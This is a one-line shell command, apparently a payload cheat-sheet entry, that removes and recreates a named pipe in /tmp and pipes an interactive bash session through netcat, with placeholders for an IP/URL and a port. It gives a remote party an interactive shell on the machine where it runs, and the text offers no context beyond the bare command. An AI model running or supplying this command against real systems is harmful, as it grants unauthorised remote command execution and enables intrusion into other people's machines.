rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP/URL> <PORT(pref 80085)> > /tmp/f
